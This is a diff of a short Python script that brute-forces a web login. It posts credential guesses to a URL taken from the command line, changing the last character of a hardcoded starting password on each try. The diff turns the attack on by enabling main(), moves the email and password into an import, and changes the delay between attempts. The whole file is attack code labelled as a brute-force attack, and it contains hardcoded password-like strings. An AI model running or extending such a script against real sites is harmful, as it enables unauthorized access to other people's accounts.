@@ -5,6 +5,7 @@
 import requests
 import time
 import sys
+from flask_app import var
 
 try:
     if sys.argv[1]:
@@ -16,21 +17,15 @@ print(url[7:-1])
 
 headers = {'User-Agent': 'Mozilla'}
 data = {
-    'email': 'test@gmail.com',
-    'password': '.5_pFO*p6s8Kcj+P'
+    'email': var.email,  # imported from flask_app
+    'password': var.password
 }
 sess = requests.Session()
 sess.headers['User-Agent'] = 'Mozilla'
-password = ''  # use this for attempting and brute-force
 
 
 def try_password(trial=''):
-    ' Send POST request with password '
-    # global url  # declaring as global variables
-    # global headers
-    # global data
-    if not trial:
-        return 'No password entered'
+    ' Send POST request attempt with password '
     try:
         data['password'] = ''.join(trial)
         print(data['password'])
@@ -44,12 +39,10 @@ def try_password(trial=''):
     return ''  # empty string if failed
 
 
-password = '.5_pFO*p6s8Kcj+T'
-password = list(password)
-
-
 def main():
     ' Perform Brute force attack '
+    password = '.5_pFO*p6s8Kcj+P'
+    password = list(password)
     for attempt in range(10):
         res = try_password(password)
         if res:  # if there is response, stop attack
@@ -58,12 +51,8 @@ def main():
         last_char = password[-1]
         last_char = chr(ord(last_char) + 1)  # increase last character
         password[-1] = last_char
-        time.sleep(0.5)  # wait for 1 second
+        time.sleep(1)  # wait for 1 second
 
-
-res = try_password(password)
-if res:
-    print(res)
 
 if __name__ == '__main__':
-    1 #main()
+    main()
